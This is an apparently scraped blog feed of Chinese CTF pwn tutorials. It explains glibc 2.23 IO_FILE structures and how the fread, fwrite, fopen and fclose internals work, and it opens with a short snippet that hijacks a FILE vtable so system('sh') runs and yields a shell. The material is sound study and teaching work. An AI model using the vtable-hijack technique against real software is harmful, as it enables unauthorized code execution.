language-c" data-language="c"><code class="language-c">vtable_addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>fake_vtable<span class="token punctuation">;</span><span class="token function">memcpy</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fake_vtable<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span>system_ptr<span class="token punctuation">;</span> <span class="token comment">//xsputn</span><span class="token comment">//这里我本地的system函数地址和ctfwiki上的示例不太一样，换成我自己的地址才能跑通的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即可getshell</p><p><img src="https://pic.imgdb.cn/item/60f00aa75132923bf87dc5bd.jpg"></p><p>同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">print &amp;_IO_2_1_stdin_$2 &#x3D; (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-初识IO_FILE</title>
      <link href="//post/pwn-%E5%88%9D%E8%AF%86IO-FILE.html"/>
      <url>//post/pwn-%E5%88%9D%E8%AF%86IO-FILE.html</url>
      
        <content type="html"><![CDATA[<h1 id="初识IO-FILE"><a href="#初识IO-FILE" class="headerlink" title="初识IO_FILE"></a>初识IO_FILE</h1><h2 id="FILE-介绍"><a href="#FILE-介绍" class="headerlink" title="FILE 介绍"></a>FILE 介绍</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。常定义一个指向 FILE 结构的指针来接收这个返回值。</p><span id="more"></span><p>FILE 结构定义在 libio.h 中，如下所示</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>       <span class="token comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_file_flags</span> <span class="token expression">_flags</span></span>  <span class="token comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  <span class="token comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_ptr<span class="token punctuation">;</span>   <span class="token comment">/* Current read pointer */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_end<span class="token punctuation">;</span>   <span class="token comment">/* End of get area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_base<span class="token punctuation">;</span>  <span class="token comment">/* Start of putback+get area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_base<span class="token punctuation">;</span> <span class="token comment">/* Start of put area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_ptr<span class="token punctuation">;</span>  <span class="token comment">/* Current put pointer. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_end<span class="token punctuation">;</span>  <span class="token comment">/* End of put area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_base<span class="token punctuation">;</span>   <span class="token comment">/* Start of reserve area. */</span>  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_end<span class="token punctuation">;</span>    <span class="token comment">/* End of reserve area. */</span>  <span class="token comment">/* The following fields are used to support backing up and undo. */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment">/* Pointer to start of non-current get area. */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment">/* Pointer to first valid character of backup area */</span>  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment">/* Pointer to end of non-current get area. */</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span>  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>  <span class="token keyword">int</span> _blksize<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>  _IO_off_t _old_offset<span class="token punctuation">;</span> <span class="token comment">/* This used to be _offset but it's too small.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__HAVE_COLUMN</span> <span class="token comment">/* temporary */</span></span>  <span class="token comment">/* 1+column number of pbase(); 0 is unknown. */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/*  char* _save_gptr;  char* _save_egptr; */</span>  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_USE_OLD_IO_FILE</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_complete</span><span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> _file<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">defined _G_IO_IO_FILE_VERSION <span class="token operator">&amp;&amp;</span> _G_IO_IO_FILE_VERSION <span class="token operator">==</span> <span class="token number">0x20001</span></span></span>  _IO_off64_t _offset<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">if</span> <span class="token expression">defined _LIBC <span class="token operator">||</span> defined _GLIBCPP_USE_WCHAR_T</span></span>  <span class="token comment">/* Wide character stream stuff.  */</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span>_codecvt<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span>_wide_data<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_freeres_list<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>_freeres_buf<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">else</span></span>  <span class="token keyword">void</span> <span class="token operator">*</span>__pad1<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__pad2<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__pad3<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__pad4<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> __pad5<span class="token punctuation">;</span>  <span class="token keyword">int</span> _mode<span class="token punctuation">;</span>  <span class="token comment">/* Make sure we don't get into trouble again.  */</span>  <span class="token keyword">char</span> _unused2<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p><p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这<strong>三个文件流位于 libc.so 的数据段</strong>。而使用 fopen 创建的文件流是<strong>分配在堆内存</strong>上的。</p><p>可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span><span class="token punctuation">&#123;</span>    _IO_FILE    file<span class="token punctuation">;</span>    IO_jump_t   <span class="token operator">*</span>vtable<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> funcs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   <span class="token number">1</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// "extra word"</span>   <span class="token number">2</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// DUMMY</span>   <span class="token number">3</span> exit<span class="token punctuation">,</span> <span class="token comment">// finish</span>   <span class="token number">4</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// overflow</span>   <span class="token number">5</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// underflow</span>   <span class="token number">6</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// uflow</span>   <span class="token number">7</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// pbackfail</span>      <span class="token number">8</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// xsputn  #printf</span>   <span class="token number">9</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// xsgetn</span>   <span class="token number">10</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seekoff</span>   <span class="token number">11</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seekpos</span>   <span class="token number">12</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// setbuf</span>   <span class="token number">13</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// sync</span>   <span class="token number">14</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// doallocate</span>   <span class="token number">15</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// read</span>   <span class="token number">16</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// write</span>   <span class="token number">17</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seek</span>   <span class="token number">18</span> pwn<span class="token punctuation">,</span>  <span class="token comment">// close</span>   <span class="token number">19</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// stat</span>   <span class="token number">20</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// showmanyc</span>   <span class="token number">21</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// imbue</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> <span class="token function">fread</span> <span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>buffer 存放读取数据的缓冲区。</li><li>size：指定每个记录的长度。</li><li>count： 指定记录的个数。</li><li>stream：目标文件流。</li><li>返回值：返回读取到数据缓冲区中的记录个数</li></ul><p>fread 的代码位于 / libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_IO_size_t<span class="token function">_IO_fread</span> <span class="token punctuation">(</span>buf<span class="token punctuation">,</span> size<span class="token punctuation">,</span> count<span class="token punctuation">,</span> fp<span class="token punctuation">)</span>     <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>     _IO_size_t size<span class="token punctuation">;</span>     _IO_size_t count<span class="token punctuation">;</span>     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  bytes_read <span class="token operator">=</span> <span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> bytes_requested<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_IO_size_t<span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span>     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>     <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>     _IO_size_t n<span class="token punctuation">;</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">_IO_XSGETN</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的，</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base        <span class="token operator">&amp;&amp;</span> want <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__underflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span> buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span> FILE<span class="token operator">*</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li><li>size: 要写入内容的单字节数;</li><li>count: 要进行写入 size 字节的数据项的个数;</li><li>stream: 目标文件指针;</li><li>返回值：实际写入的数据项个数 count。</li></ul><p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p><p>根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">written <span class="token operator">=</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Next flush the (full) buffer. */</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>_IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">==</span> f<span class="token operator">-></span>_IO_buf_end <span class="token punctuation">)</span> <span class="token comment">/* Buffer is really full */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">FILE <span class="token operator">*</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token operator">*</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>filename: 目标文件的路径</li><li>type: 打开方式的类型</li><li>返回值: 返回一个文件指针</li></ul><p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p><p>首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span>new_f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">locked_FILE</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">locked_FILE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">_IO_JUMPS</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-></span>fp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>_IO_file_jumps<span class="token punctuation">;</span><span class="token function">_IO_file_init</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-></span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token function">_IO_link_in</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span>     <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>file<span class="token punctuation">.</span>_flags <span class="token operator">&amp;</span> _IO_LINKED<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      fp<span class="token operator">-></span>file<span class="token punctuation">.</span>_flags <span class="token operator">|=</span> _IO_LINKED<span class="token punctuation">;</span>      fp<span class="token operator">-></span>file<span class="token punctuation">.</span>_chain <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>      _IO_list_all <span class="token operator">=</span> fp<span class="token punctuation">;</span>      <span class="token operator">++</span>_IO_list_all_stamp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_file_fopen</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> new_f<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> is32<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">__fopen_maybe_mmap</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-></span>fp<span class="token punctuation">.</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>总结一下 fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fclose</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p><p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_file_flags <span class="token operator">&amp;</span> _IO_IS_FILEBUF<span class="token punctuation">)</span>    <span class="token function">_IO_un_link</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_file_flags <span class="token operator">&amp;</span> _IO_IS_FILEBUF<span class="token punctuation">)</span>    status <span class="token operator">=</span> <span class="token function">_IO_file_close_it</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">_IO_FINISH</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 